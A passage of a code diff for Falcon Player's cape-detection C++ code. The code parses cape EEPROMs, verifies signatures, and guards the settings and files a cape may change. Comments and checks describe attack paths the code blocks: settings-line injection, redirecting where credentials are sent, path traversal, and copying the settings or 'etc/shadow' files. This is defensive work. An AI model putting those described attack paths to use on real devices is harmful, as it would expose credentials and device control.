+               JURISDICTIONS_FILE.c_str());
+        return true;
+    }
+    bool dflt = cfg.get("priorOptInDefault", false).asBool();
+    std::string j = g_jurisdictionOverride.empty() ? inferJurisdiction(lines, cfg)
+                                                   : g_jurisdictionOverride;
+    if (j.empty()) {
+        // Nothing recorded and nothing inferable: we do not know where this box
+        // is. That is the same state as an unreadable policy file above, and it
+        // gets the same cautious answer.
+        //
+        // It is NOT the same as priorOptInDefault, which answers a different
+        // question -- what an unrecognised jurisdiction VALUE means -- and is
+        // false on purpose, so that the strict path is taken on a positive match
+        // rather than by accident. Conflating the two made a fresh box
+        // permissive, because nothing writes TimeZone into the settings file:
+        // FPPINIT only reads it and the setup wizard is the first writer, so on
+        // first boot both keys are absent and detection ran before anyone had
+        // been asked anything. The PHP half disagreed, reading TimeZone from
+        // $settings where settings.json's Europe/London default had been merged
+        // in -- so the two halves of one policy answered differently on the same
+        // box, which is precisely what sharing jurisdictions.json was meant to
+        // prevent.
+        //
+        // The cost is bounded and is what the design always said should happen:
+        // a cape's transmitting default is HELD on first boot and offered again
+        // by the wizard once the user says where they are.
+        return true;
+    }
+    if (!cfg["jurisdictions"].isMember(j)) {
+        return dflt;
+    }
+    return cfg["jurisdictions"][j].get("priorOptIn", dflt).asBool();
+}
+
+// Rank of a settings value on the "how much does this transmit" scale, from the
+// transmitRank map declared beside the setting in www/settings.json. Returns
+// false for anything unranked -- FetchVendorLogos has no rank because it is a
+// remote image rather than telemetry, and unranked keys are not subject to the
+// ratchet at all.
+static const Json::Value& settingMeta(const std::string& key) {
+    static Json::Value settings;
+    static bool loaded = false;
+    static const Json::Value none;
+    if (!loaded) {
+        loaded = true;
+        LoadJsonFromFile("/opt/fpp/www/settings.json", settings, CapeJsonRoot::Object);
+    }
+    if (!settings.isMember("settings") || !settings["settings"].isMember(key)) {
+        return none;
+    }
+    return settings["settings"][key];
+}
+
+// A setting governs what the device discloses if it declares a transmitRank map --
+// that map exists precisely to say how much each of its values transmits.
+static bool settingIsPrivacyGoverned(const std::string& key) {
+    return settingMeta(key).isMember("transmitRank");
+}
+
+static bool transmitRank(const std::string& key, const std::string& value, int& rank) {
+    const Json::Value& meta = settingMeta(key);
+    if (!meta.isMember("transmitRank") || !meta["transmitRank"].isMember(value)) {
+        return false;
+    }
+    rank = meta["transmitRank"][value].asInt();
+    return true;
+}
+
+// May a cape set `key` to `value`?
+//   - never, if the user has already set it
+//   - always, if the key is not ranked telemetry
+//   - otherwise only where the jurisdiction permits a transmitting default, or
+//     where the proposed value transmits no more than the shipped default
+// Three outcomes, not two. "Already set to something else" is worth saying out
+// loud -- the cape wanted one thing and the box has another. "Already set to
+// exactly this" is not: there is no conflict, nothing to change, and warning
+// about it just trains people to ignore the log.
+enum class CapeSettingAction {
+    Apply,
+    SkipUnchanged,
+    Refuse
+};
+
+// Whether a signed cape may retire a setting outright.
+//
+// This deliberately does NOT ask whether the value is already set.  A removal's
+// precondition is that it IS set -- routing removes through the never-override rule
+// that guards defaultSettings made every removal of a real value refuse, which is
+// every removal that could have done anything, so removeSettings could only ever
+// clear a key whose value was the empty string.  The signature the caller has
+// already checked is what authorizes a removal; that is the whole reason removes
+// require one and defaults do not.
+//
+// What a cape may not retire is a setting that governs what the device discloses.
+// Removing one restores FPP's shipped default, and those defaults transmit -- so a
+// cape could raise disclosure simply by deleting the user's answer.  Whether it
+// would happen to raise it on this box is not the test: a cape has no business
+// deciding that question at all.
+static bool capeMayRemoveSetting(const std::string& key, std::string& why) {
+    if (settingIsPrivacyGoverned(key)) {
+        why = "it controls what this device transmits";
+        return false;
+    }
+    return true;
+}
+
+static CapeSettingAction capeMaySetSetting(const std::vector<std::string>& lines, const std::string& key,
+                                           const std::string& value, bool strict, std::string& why,
+                                           bool userRequestedReset = false) {
+    // Every setting is one `key = "value"` line, written as is. A line break
+    // in either half would add lines of the cape's choosing -- any key, past
+    // every rule below, SigningAPIHost included -- and a quote or `=` in the
+    // key would make it read back as some other key. The settings API and
+    // fppd's own writer refuse these too; this is the cape's writer.
+    static const std::string kLineBreaks("\r\n\0", 3);
+    if (key.empty() || key.find_first_of(kLineBreaks + "\"=") != std::string::npos ||
+        value.find_first_of(kLineBreaks) != std::string::npos) {
+        why = "it would not stay a single settings line";
+        return CapeSettingAction::Refuse;
+    }
+    // Settings no cape sets, signed or not, and however it asks: they decide
+    // where this device sends secrets.  SigningAPIHost is where the cape pages
+    // send the SoC serial, the order ID and the FalconPlayer account password
+    // (voucher redeem); unset by default, so an unsigned cape could point it
+    // at its own server.
+    static const std::set<std::string> kCapeNeverSets = { "SigningAPIHost" };
+    if (kCapeNeverSets.count(key)) {
+        why = "it decides where this device sends its serial and account credentials";
+        return CapeSettingAction::Refuse;
+    }
+    // Never-override protects the user from the CAPE deciding. It is not meant to
+    // stop the user deciding: `fppcapedetect -force-defaults` is what the "reset
+    // to defaults" action in the firmware-upgrade UI passes, so there the
+    // overwrite is the thing that was asked for. Different actors, different
+    // answers.
+    //
+    // The telemetry ratchet below still applies either way. Asking to reset
+    // defaults is not a jurisdiction changing, and Art 25(2) does not bend
+    // because somebody clicked a button.
+    if (settingIsSet(lines, key)) {
+        if (readSettingValue(lines, key) == value) {
+            // Nothing to do and nothing to report, whether or not a reset was
+            // asked for -- rewriting a value with itself would only mark the
+            // settings file dirty and cause a needless write.
+            return CapeSettingAction::SkipUnchanged;
+        }
+        if (!userRequestedReset) {
+            why = "the user has set it to something else";
+            return CapeSettingAction::Refuse;
+        }
+    }
+    int proposed = 0;
+    if (!transmitRank(key, value, proposed)) {
+        return CapeSettingAction::Apply;
+    }
+    if (!strict) {
+        return CapeSettingAction::Apply;
+    }
+    // Under a prior-opt-in regime the only default a cape may set is one that
+    // transmits nothing: rank 0.
+    //
+    // Anchoring this to FPP's *shipped* default instead was the obvious reading
+    // and it is wrong. When that default was "3", the maximum-disclosure value,
+    // a cape could have set full crash reporting under EU rules simply because
+    // the baseline was already maximal. The unanswered default is 1 now, which
+    // makes the example less alarming and changes nothing about the rule: a
+    // ratchet against a baseline inherits whatever that baseline is, and 1 still
+    // transmits. Art 25(2) asks for the protective value, not the incumbent one.
+    if (proposed > 0) {
+        // Phrased without a subject: this reaches the boot log one setting at a
+        // time, and the setup wizard groups several settings under one reason.
+        // "it transmits" read wrong against a list of three.
+        why = "this jurisdiction requires prior opt-in before a device may transmit";
+        return CapeSettingAction::Refuse;
+    }
+    return CapeSettingAction::Apply;
+}
+
+class CapeInfo {
+public:
+    CapeInfo(bool ro, bool fd = false) :
+        readOnly(ro),
+        forceDefaults(fd),
+        bus(I2C_DEV) {
+        char buf[256] = "/tmp/fppcuXXXXXX";
+        outputPath = mkdtemp(buf);
+
+        std::string tmpPath = outputPath + "/tmp";
+        mkdir(tmpPath.c_str(), 0700);
+
+        findCapeEEPROM();
+        if (EEPROM != "") {
+            try {
+                parseEEPROM();
+                processEEPROM();
+            } catch (std::exception& ex) {
+                corruptEEPROM = true;
+                printf("Corrupt EEPROM: %s\n", ex.what());
+                // nothing from a corrupt image is published: files extracted
+                // before the failure can be truncated (an EEPROM ending inside
+                // a section, or a partly written one), and a truncated
+                // cape-image.xbm takes down fppoled
+                std::filesystem::remove_all(outputPath);
+                mkdir(outputPath.c_str(), 0700);
+                mkdir(tmpPath.c_str(), 0700);
+            }
+        }
+        loadFiles();
+        std::filesystem::remove_all(outputPath);
+    }
+
+    ~CapeInfo() {
+    }
+
+    CapeUtils::CapeStatus capeStatus() {
+        if (corruptEEPROM) {
+            return CapeUtils::CapeStatus::CORRUPT;
+        }
+        if (validSignature) {
+            if (ORIGEEPROM.find("sys/bus/i2c") != std::string::npos) {
+                return CapeUtils::CapeStatus::SIGNED;
+            } else if (devsn != "") {
+                return CapeUtils::CapeStatus::SIGNED;
+            }
+            return CapeUtils::CapeStatus::SIGNED_GENERIC;
+        }
+        if (!validSignature && EEPROM != "") {
+            return CapeUtils::CapeStatus::UNSIGNED;
+        }
+        return CapeUtils::CapeStatus::NOT_PRESENT;
+    }
+
+    bool hasFile(const std::string& path) {
+        return fileMap.find(path) != fileMap.end();
+    }
+    const std::vector<uint8_t>& getFile(const std::string& path) {
+        static std::vector<uint8_t> EMPTY;
+        if (hasFile(path)) {
+            return fileMap[path];
+        }
+        return EMPTY;
+    }
+
+    int getLicensedOutputs() {
+        if (hasSignature && validSignature && (fkeyId != "")) {
+            if (fkeyId != "fp") {
+                return 9999;
+            } else if (signedExtras.find("licensePorts") != signedExtras.end()) {
+                return atoi(signedExtras["licensePorts"][0].c_str());
+            }
+        }
+        return 0;
+    }
+    const std::string& getKeyId() const {
+        return fkeyId;
+    }
+    const Json::Value& getCapeInfo() const {
+        return capeInfo;
+    }
+
+private:
+    void loadFiles() {
+        std::vector<std::string> files;
+        if (!readOnly) {
+            getFileList(outputPath + "/tmp", "", files);
+            for (auto a : files) {
+                std::string src = outputPath + "/tmp" + a;
+                std::string target = "/home/fpp/media/tmp" + a;
+
+                if (target[target.length() - 1] == '/') {
+                    mkdir(target.c_str(), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
+                    setOwnerGroup(target);
+                } else {
+                    copyFile(src, target);
+                    setFilePerms(target);
+                }
+            }
+            files.clear();
+        }
+        getFileList(outputPath, "", files);
+        for (auto a : files) {
+            std::string src = outputPath + a;
+
+            if (a[a.length() - 1] != '/') {
+                int len = fileSize(src);
+                FILE* f = len > 0 ? fopen(src.c_str(), "rb") : nullptr;
+                if (f == nullptr) {
+                    fileMap[a].clear();
+                    continue;
+                }
+                fileMap[a].resize(len);
+                int l2 = fread(&fileMap[a][0], 1, len, f);
+                fclose(f);
+            }
+        }
+    }
+
+    void findCapeEEPROM() {
+        // The cape EEPROM is normally on i2c2 (UART1_RTSN/CTSN). On am335xpm
+        // kernels with the trimmed overlay, the bone-pinmux-helper no longer
+        // muxes those pins to i2c2 at boot, so do it here. Query first so we can
+        // restore the original mode if the EEPROM turns out not to be on i2c2.
+        // No-op on older kernels (helper already set i2c2; query reports "i2c").
+#ifdef PLATFORM_BBB
+        std::string i2c2_o1, i2c2_o2;
+        if (!isPocketBeagle()) {
+            i2c2_o1 = PinCurrentMode("P9_19");
+            i2c2_o2 = PinCurrentMode("P9_20");
+            if (i2c2_o1 != "i2c") ConfigurePin("P9_19", "i2c");
+            if (i2c2_o2 != "i2c") ConfigurePin("P9_20", "i2c");
+        }
+#endif
+        waitForI2CBus(bus);
+
+        // Cape detection is not the only thing that lands here: CapeInfo is built
+        // lazily once per *process*, so fppd re-runs this whole probe when a
+        // channel output first asks for a string/panel config, long after fppoled
+        // has muxed and claimed its button pins. Only the first run has to search
+        // for the bus -- it records the answer -- so later runs take it from the
+        // recorded location and never go near the i2c1 pins.
+        int knownBus = recordedEEPROMBus();
+        if (knownBus > 0) {
+            printf("Using the cape EEPROM already located on i2c%d this boot.\n", knownBus);
+            bus = knownBus;
+        } else if (bus == 2 && !HasI2CDevice(0x50, bus, 1000)) {
+            printf("Did not find 0x50 on i2c2, trying i2c1.\n");
+            ConfigureI2C1BusPins(true);
+            if (HasI2CDevice(0x50, 1, 250)) {
+                bus = 1;
+            } else {
+                ConfigureI2C1BusPins(false);
+            }
+        }
+        // If we forced i2c on the i2c2 pins but the EEPROM isn't on i2c2, restore.
+#ifdef PLATFORM_BBB
+        if (bus != 2) {
+            if (!i2c2_o1.empty() && i2c2_o1 != "i2c") ConfigurePin("P9_19", i2c2_o1.c_str());
+            if (!i2c2_o2.empty() && i2c2_o2 != "i2c") ConfigurePin("P9_20", i2c2_o2.c_str());
+        }
+#endif
+        // Give this one a short retry too. By now the bus is settled, but a miss
+        // here is expensive out of proportion to the wait: it drops the cape's
+        // whole config in favour of the generic /opt/fpp-vendor fallback, and in
+        // fppd (which re-runs all of this per process) that means a cape that
+        // worked at boot silently coming up as no cape at all.
+        if (HasI2CDevice(0x50, bus, 250)) {
+            EEPROM = string_sprintf("/sys/bus/i2c/devices/%d-0050/eeprom", bus);
+            if (!file_exists(EEPROM)) {
+                std::string newDevFile = string_sprintf("/sys/bus/i2c/devices/i2c-%d/new_device", bus);
+                int f = open(newDevFile.c_str(), O_WRONLY);
+                write(f, "24c256 0x50", 11);
+                close(f);
+
+                for (int x = 0; x < 1500; x++) {
+                    if (file_exists(EEPROM)) {
+                        break;
+                    }
+                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
+                }
+
+                if (!file_exists(EEPROM)) {
+                    // try again
+                    newDevFile = string_sprintf("/sys/bus/i2c/devices/i2c-%d/new_device", bus);
+                    f = open(newDevFile.c_str(), O_WRONLY);
+                    write(f, "24c256 0x50", 11);
+                    close(f);
+                    for (int x = 0; x < 200; x++) {
+                        if (file_exists(EEPROM)) {
+                            break;
+                        }
+                        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+                    }
+                }
+            }
+            if (!file_exists(EEPROM)) {
+                printf("Couldn't get eeprom\n");
+            }
+            printf("Copying eeprom %s -> %s\n", EEPROM.c_str(), "/home/fpp/media/tmp/eeprom.bin");
+            removeIfExist("/home/fpp/media/tmp/eeprom.bin");
+            copyEEPROM(EEPROM, "/home/fpp/media/tmp/eeprom.bin");
+            uid_t fppUid = 0;
+            gid_t fppGid = 0;
+            if (getFppUserIds(fppUid, fppGid)) {
+                chown("/home/fpp/media/tmp/eeprom.bin", fppUid, fppGid);
+            }
+            ORIGEEPROM = EEPROM;
+            put_file_contents("/home/fpp/media/tmp/eeprom_location.txt", (uint8_t*)ORIGEEPROM.c_str(), ORIGEEPROM.size());
+            EEPROM = "/home/fpp/media/tmp/eeprom.bin";
+
+            std::string newDevFile = string_sprintf("/sys/bus/i2c/devices/i2c-%d/delete_device", bus);
+            int f = open(newDevFile.c_str(), O_WRONLY);
+            write(f, "0x50", 5);
+            close(f);
+        } else {
+            printf("Did not find eeprom on i2c.\n");
+        }
+        if (!file_exists(EEPROM)) {
+            printf("EEPROM file doesn't exist %s.\n", EEPROM.c_str());
+            EEPROM = "/opt/fpp-vendor/cape-eeprom.bin";
+        }
+        if (!file_exists(EEPROM)) {
+            EEPROM = "/home/fpp/media/config/cape-eeprom.bin";
+        }
+        if (!file_exists(EEPROM)) {
+            EEPROM = mapV5Config(EEPROM);
+        }
+        if (!file_exists(EEPROM)) {
+            EEPROM = checkUnsupported(EEPROM, bus);
+        }
+        if (!file_exists(EEPROM)) {
+            printf("Could not detect any cape\n");
+            EEPROM = "";
+            // A read-only probe (fppd's outputs, the setup wizard's dry run)
+            // must not rewrite config.txt or reboot; the boot-time run does.
+            if (!readOnly) {
+                handleReboot(handleCapeOverlay("/home/fpp/media/"));
+            }
+            return;
+        }
+        printf("Using %s\n", EEPROM.c_str());
+        uint8_t buffer[12];
+        FILE* file = fopen(EEPROM.c_str(), "rb");
+        int l = file ? fread(buffer, 1, 6, file) : 0;
+        if (l < 6 || buffer[0] != 'F' || buffer[1] != 'P' || buffer[2] != 'P' || buffer[3] != '0' || buffer[4] != '2') {
+            printf("EEPROM header miss-match\n");
+            EEPROM = "/home/fpp/media/config/cape-eeprom.bin";
+            if (!file_exists(EEPROM)) {
+                EEPROM = "";
+                // No cape, same as the "Could not detect any cape" path above,
+                // so drop a cape overlay left from a previous boot the same way.
+                // Otherwise an eeprom that is present but unreadable keeps the
+                // old overlay applied forever, and the i2c addresses it binds
+                // then block rewriting the eeprom that would fix it.
+                if (file) {
+                    fclose(file);
+                }
+                if (!readOnly) {
+                    handleReboot(handleCapeOverlay("/home/fpp/media/"));
+                }
+                return;
+            }
+            printf("Using %s\n", EEPROM.c_str());
+        }
+        if (file) {
+            fclose(file);
+        }
+    }
+
+    void parseEEPROM() {
+        // Owned here: the section parser throws on a malformed image, and the
+        // buffer and file both leaked on every throw (and on the early return).
+        std::unique_ptr<uint8_t[]> bufferHolder(new uint8_t[32768]); // 32K is the largest eeprom we support, more than enough
+        uint8_t* buffer = bufferHolder.get();
+        FILE* file = fopen(EEPROM.c_str(), "rb");
+        if (file == nullptr) {
+            printf("Failed to open eeprom: %s\n", EEPROM.c_str());
+            printf("   error: %s\n", strerror(errno));
+            return;
+        }
+        std::unique_ptr<FILE, int (*)(FILE*)> fileHolder(file, fclose);
+        int l = fread(buffer, 1, 6, file);
+
+        if (buffer[0] == 'F' && buffer[1] == 'P' && buffer[2] == 'P' && buffer[3] == '0' && buffer[4] == '2') {
+            cape = read_string(file, 26);   // cape name + nulls
+            capev = read_string(file, 10);  // cape version + nulls
+            capesn = read_string(file, 16); // cape serial# + nulls
+            printf("Found cape %s, Version %s, Serial Number: %s\n", cape.c_str(), capev.c_str(), capesn.c_str());
+
+            int flen = read_section_length(file); // length of the section
+            while (flen) {
+                int flag = std::stoi(read_string(file, 2));
+                std::string path;
+                if (flag < 50) {
+                    path = outputPath + "/";
+                    path += checked_section_name(read_string(file, 64));
+                }
+                switch (flag) {
+                case 0:
+                case 1:
+                case 2:
+                case 3: {
+                    if ((int)fread(buffer, 1, flen, file) != flen) {
+                        throw std::runtime_error("EEPROM image ends inside " + path);
+                    }
+                    std::filesystem::create_directories(std::filesystem::path(path).parent_path());
+                    put_file_contents(path, buffer, flen);
+                    std::string dir = std::filesystem::path(path).parent_path().string();
+                    if (flag == 1) {
+                        run_in_dir(dir, { "unzip", path });
+                        unlink(path.c_str());
+                    } else if (flag == 2) {
+                        run_in_dir(dir, { "tar", "-xzf", path });
+                        unlink(path.c_str());
+                    } else if (flag == 3) {
+                        run_in_dir(dir, { "tar", "-xjf", path });
+                        unlink(path.c_str());
+                    }
+                    printf("- extracted file: %s\n", path.c_str());
+                    break;
+                }
+                case 96: {
+                    if (hasSignature && validEpromLocation && validSignature) {
+                        capesn = read_string(file, 16);
+                        devsn = read_string(file, 42);
+                    } else {
+                        // skip
+                        read_string(file, 16);
+                        read_string(file, 42);
+                    }
+                    break;
+                }
+                case 97: {
+                    if (flen < 12) {
+                        throw std::runtime_error("invalid extras section length");
+                    }
+                    std::string eKey = read_string(file, 12);
+                    std::string eValue = read_string(file, flen - 12);
+                    if (hasSignature && validEpromLocation && validSignature) {
+                        signedExtras[eKey].push_back(eValue);
+                    } else {
+                        extras[eKey].push_back(eValue);
+                    }
+                    break;
+                }
+                case 98: {
+                    std::string type = read_string(file, 2);
+                    if (type == "1") {
+                        if (ORIGEEPROM.find("sys/bus/i2c") == std::string::npos) {
+                            validEpromLocation = false;
+                        }
+                    } else if (type == "2") {
+                        if (EEPROM.find("cape-eeprom.bin") == std::string::npos) {
+                            validEpromLocation = false;
+                        }
+                    } else if (type != "0") {
+                        validEpromLocation = false;
+                    }
+
+                    if (validEpromLocation) {
+                        printf("- eeprom location is valid\n");
+                    } else {
+                        printf("- ERROR eeprom location is NOT valid\n");
+                    }
+                    break;
+                }
+                case 99: {
+                    if (flen < 6) {
+                        throw std::runtime_error("invalid signature section length");
+                    }
+                    hasSignature = true;
+                    fkeyId = read_string(file, 6);
+                    fread(buffer, 1, flen - 6, file);
+                    DoSignatureVerify(file, fkeyId, path, validSignature, buffer, flen - 6);
+
+                    if (validSignature)
+                        printf("- signature verified for key ID: %s\n", fkeyId.c_str());
+                    else
+                        printf("- ERROR signature is NOT valid for key ID: %s\n", fkeyId.c_str());
+                    break;
+                }
+                default:
+                    fseek(file, flen, SEEK_CUR);
+                    printf("Don't know how to handle -%s- with type %d and length %d\n", path.c_str(), flag, flen);
+                }
+                flen = read_section_length(file); // length of the section
+            }
+        }
+
+        if (signedExtras.find("deviceSerial") != signedExtras.end()) {
+            char serialCmd[] = "sed -n 's/^Serial.*: //p' /proc/cpuinfo";
+            std::string serialNumber = trim(exec(serialCmd));
+            if (serialNumber != signedExtras["deviceSerial"][0]) {
+                // If the device Serial Number does not match the signed Serial Number in the EEPROM, treat like an invalid signature
+                validSignature = false;
+                hasSignature = true;
+                printf("- ERROR device serial number in EEPROM (%s) does NOT match physical device (%s)\n",
+                       signedExtras["deviceSerial"][0].c_str(), serialNumber.c_str());
+            }
+        }
+
+        if (!validEpromLocation) {
+            // if the eeprom location is not valid, treat like an invalid signature
+            validSignature = false;
+            hasSignature = true;
+        }
+        if (!hasSignature || !validSignature) {
+            // not a valid signed eeprom, remove stuff that requires it
+            removeIfExist(outputPath + "/tmp/cape-sensors.json");
+            removeIfExist(outputPath + "/tmp/cape-inputs.json");
+            removeIfExist(outputPath + "/tmp/defaults/config/sensors.json");
+        }
+    }
+    void configurePin(const std::string& pin, const std::string& mode) {
+#ifdef PLATFORM_BB64
+        std::string cmd = "/usr/bin/pinctrl -s " + CapeShellQuote(pin) + " " + CapeShellQuote(mode);
+        exec(cmd);
+#elif defined(PLATFORM_PI)
+        std::string cmd = "/usr/bin/pinctrl set " + CapeShellQuote(pin) + " " + CapeShellQuote(mode);
+        exec(cmd);
+#endif
+    }
+
+    void processEEPROM() {
+        // if the cape-info has default settings and those settings are not already set, set them
+        // also put the serialNumber into the cape-info for display
+        if (file_exists(outputPath + "/tmp/cape-info.json")) {
+            Json::Value result;
+            if (LoadJsonFromFile(outputPath + "/tmp/cape-info.json", result, CapeJsonRoot::Object)) {
+                std::set<std::string> removes;
+                if (hasSignature) {
+                    result["validEepromLocation"] = validEpromLocation;
+                }
+                if (ORIGEEPROM != "") {
+                    result["eepromLocation"] = ORIGEEPROM;
+                } else {
+                    result["eepromLocation"] = EEPROM;
+                }
+                if (result.isMember("removeSettings")) {
+                    for (int x = 0; x < result["removeSettings"].size(); x++) {
+                        std::string v = result["removeSettings"][x].asString();
+                        removes.insert(v);
+                    }
+                }
+                for (auto kv : extras) {
+                    if (kv.second.size() > 1) {
+                        for (auto e : kv.second) {
+                            result[kv.first].append(e);
+                        }
+                    } else {
+                        result[kv.first] = kv.second[0];
+                    }
+                }
+                if (result.isMember("signed")) {
+                    // make sure any "not really signed" extras are removed from the cape-info
+                    result.removeMember("signed");
+                }
+                for (auto kv : signedExtras) {
+                    if (kv.second.size() > 1) {
+                        for (auto e : kv.second) {
+                            result["signed"][kv.first].append(e);
+                        }
+                    } else {
+                        result["signed"][kv.first] = kv.second[0];
+                    }
+                }
+
+                // A signature that verifies but is not bound to this hardware used
+                // to be reported by deleting the user's FetchVendorLogos choice, so
+                // that the page's logo <img> carried the serial to the vendor.  The
+                // goal was right and the mechanism was not: it overrode a privacy
+                // choice to smuggle out a request, it was silent, and a user who
+                // simply turned logos off defeated it.  The state is recorded as
+                // licenseCheck below and reported explicitly instead --
+                // src/CapeLicenseNotify.cpp and www/capeLicense.inc.
+                if (result["id"].asString() != "Unsupported" && result["id"].asString() != "Unknown") {
+                    result["serialNumber"] = capesn;
+                }
+                std::vector<std::string> lines;
+                bool settingsChanged = false;
+                if (!validSignature) {
+                    if (result.isMember("verifiedKeyId"))
+                        result.removeMember("verifiedKeyId");
+                } else {
+                    result["verifiedKeyId"] = fkeyId;
+                }
+                if (!readOnly) {
+                    readSettingsFile(lines);
+                    // Whether this device is somewhere that requires asking before
+                    // transmitting. Resolved once: the recorded LegalJurisdiction,
+                    // or an inference from the time zone until the user answers.
+                    bool strictPrivacy = priorOptInRequired(lines);
+
+                    // removeSettings requires a signature; defaultSettings does not.
+                    //
+                    // The asymmetry is not arbitrary. defaultSettings only writes a key
+                    // that is absent, so the user is free to set it and keep it -- the
+                    // worst an unsigned cape achieves is choosing a default nobody had
+                    // chosen, which is what a default is. removeSettings deletes a value
+                    // the user may have set deliberately and restores FPP's shipped one,
+                    // which is a change nobody asked for; that wants provenance.
+                    if (!removes.empty() && !validSignature) {
+                        printf("CapeUtils: ignoring removeSettings from an unsigned EEPROM "
+                               "(%zu key(s)); removing a setting requires a valid signature\n",
+                               removes.size());
+                        removes.clear();
+                    }
+                    for (auto& v : removes) {
+                        std::string why;
+                        if (!capeMayRemoveSetting(v, why)) {
+                            printf("CapeUtils: cape may not remove setting %s: %s\n",
+                                   v.c_str(), why.c_str());
+                            continue;
+                        }
+                        for (int l = 0; l < lines.size(); l++) {
+                            std::size_t eq = lines[l].find('=');
+                            if (eq != std::string::npos && trim(lines[l].substr(0, eq)) == v) {
+                                lines.erase(lines.begin() + l);
+                                settingsChanged = true;
+                                break;
+                            }
+                        }
+                    }
+                    if (result.isMember("defaultSettings")) {
+                        for (auto a : result["defaultSettings"].getMemberNames()) {
+                            std::string v = result["defaultSettings"][a].asString();
+                            // A cape may set a default; it may never override a
+                            // value the user has chosen. forceDefaults no longer
+                            // changes that -- it exists so a cape can refresh its
+                            // OWN defaults, not to overrule the person using it.
+                            std::string why;
+                            CapeSettingAction action =
+                                capeMaySetSetting(lines, a, v, strictPrivacy, why, forceDefaults);
+                            if (action == CapeSettingAction::SkipUnchanged) {
+                                // Already exactly this. Silent: there is nothing to
+                                // change and nothing to disagree about.
+                                continue;
+                            }
+                            if (action == CapeSettingAction::Refuse) {
+                                printf("CapeUtils: cape may not set %s=%s: %s\n",
+                                       a.c_str(), v.c_str(), why.c_str());
+                                continue;
+                            }
+                            // With -force-defaults an existing line is replaced rather
+                            // than duplicated; without it the key is absent by the
+                            // check above, so this only ever appends.
+                            bool replaced = false;
+                            for (int l = 0; l < lines.size(); l++) {
+                                std::size_t eq = lines[l].find('=');
+                                if (eq != std::string::npos && trim(lines[l].substr(0, eq)) == a) {
+                                    lines[l] = a + " = \"" + v + "\"";
+                                    replaced = true;
+                                    break;
+                                }
+                            }
+                            if (!replaced) {
+                                lines.push_back(a + " = \"" + v + "\"");
+                            }
+                            settingsChanged = true;
+                        }
+                    }
+                    // The branch that used to switch statistics ON for an unsigned
+                    // EEPROM is gone. It fired precisely when the cape was least
+                    // trusted, wrote a transmitting value the user had never chosen,
+                    // and stripped the cape's own sendStats opt-out while doing it.
+                    if ((!hasSignature || !validSignature) && result.isMember("sendStats")) {
+                        result.removeMember("sendStats");
+                    }
+
+                    bool reboot = false;
+                    if (result.isMember("bootConfig")) {
+                        // if the cape requires changes/update to config.txt (Pi) or uEnv.txt (BBB)
+                        // we need to process them and see if we have to apply the changes and reboot or not
+                        reboot = processBootConfig(result["bootConfig"], hasSignature && validSignature);
+                    }
+                    if (result.isMember("copyFiles")) {
+                        // if the cape requires certain files copied into place (asoundrc for example)
+                        //
+                        // The capability itself is legitimate and deliberately broad: a cape may
+                        // need to write outside the media directory, for instance an apt source in
+                        // /etc/apt/sources.list.d so a driver can be installed. What is constrained
+                        // here is provenance and one specific target, not paths in general.
+                        static const std::string MEDIA_DIR = "/home/fpp/media/";
+                        for (auto srcName : result["copyFiles"].getMemberNames()) {
+                            std::string src = srcName;
+                            std::string target = result["copyFiles"][srcName].asString();
+                            bool srcAbsolute = !src.empty() && src[0] == '/';
+                            bool targetAbsolute = !target.empty() && target[0] == '/';
+
+                            // No traversal in either direction. Nothing legitimate needs it, and
+                            // it is what makes the media-relative form below mean anything --
+                            // "../../etc/x" would otherwise walk straight out of it.
+                            if (src.find("..") != std::string::npos ||
+                                target.find("..") != std::string::npos) {
+                                printf("CapeUtils: refusing copyFiles entry with '..' in a path: %s -> %s\n",
+                                       src.c_str(), target.c_str());
+                                continue;
+                            }
+
+                            // An unsigned EEPROM may read only from FPP's own install tree. The
+                            // risk is which file is read, not that the path is absolute: the
+                            // shipped asoundrc pattern names /opt/fpp/etc/... and must keep
+                            // working, while /home/fpp/media/settings as a source would copy every
+                            // password on the box somewhere the web UI serves. That holds for a
+                            // relative source too: only a signed image's is taken from the image
+                            // itself, so an unsigned "etc/shadow" resolved against the working
+                            // directory -- / at boot.
+                            if (!validSignature && src.rfind("/opt/fpp/", 0) != 0) {
+                                printf("CapeUtils: refusing copyFiles from %s: unsigned EEPROMs may "
+                                       "only copy from /opt/fpp/\n", src.c_str());
+                                continue;
+                            }
+                            if (validSignature && !srcAbsolute) {
+                                src = outputPath + "/" + src;
+                            }
+
+                            if (!targetAbsolute) {
+                                target = MEDIA_DIR + target;
+                            } else if (!validSignature && target.rfind(MEDIA_DIR, 0) != 0) {
+                                // Writing outside the media directory means things like adding a
+                                // package source, which installs arbitrary code as root. A signed
+                                // cape may do it; an unsigned one may not.
+                                printf("CapeUtils: refusing copyFiles to %s: writing outside %s "
+                                       "requires a valid signature\n", target.c_str(), MEDIA_DIR.c_str());
+                                continue;
+                            }
+
+                            // The settings file is never a valid target, signed or not. Overwriting
+                            // it wholesale bypasses every rule applied to defaultSettings above --
+                            // never-override, the telemetry ratchet, the jurisdiction check -- and
+                            // does it silently. A cape that wants to set a setting has
+                            // defaultSettings, which is governed.
+                            if (target == MEDIA_DIR + "settings" ||
+                                target.rfind(MEDIA_DIR + "settings/", 0) == 0) {
+                                printf("CapeUtils: refusing copyFiles to the settings file; use "
+                                       "defaultSettings\n");
+                                continue;
+                            }
+
+                            copyFile(src, target);
+                            setFilePerms(target);
+                        }
+                    }
+                    reboot |= handleCapeOverlay(outputPath);
+                    handleReboot(reboot);
+                    if (result.isMember("modules")) {
+                        // if the cape requires kernel modules, load them at this
+                        // time so they will be available later
+                        loadModules(result["modules"]);
+                    }
+                    if (result.isMember("pinctrl")) {
+                        // if the cape requires pins set to a particular mode, set them now
+                        for (auto pin : result["pinctrl"].getMemberNames()) {
+                            for (int x = 0; x < result["pinctrl"][pin].size(); x++) {
+                                std::string v = result["pinctrl"][pin][x].asString();
+                                configurePin(pin, v);
+                            }
+                        }
+
+                        // some modules will not bind until their pins are in the
+                        // right mode, so retry them now that pinctrl is applied
+                        if (result.isMember("modules")) {
+                            loadModules(result["modules"]);
+                        }
+                    }
+                    if (result.isMember("i2cDevices") && !readOnly) {
+                        // if the cape has i2c devices on it that need to be registered, load them at this
+                        // time so they will be available later
+                        for (int x = 0; x < result["i2cDevices"].size(); x++) {
+                            std::string v = result["i2cDevices"][x].asString();
+
+                            std::string newDevFile = string_sprintf("/sys/bus/i2c/devices/i2c-%d/new_device", bus);
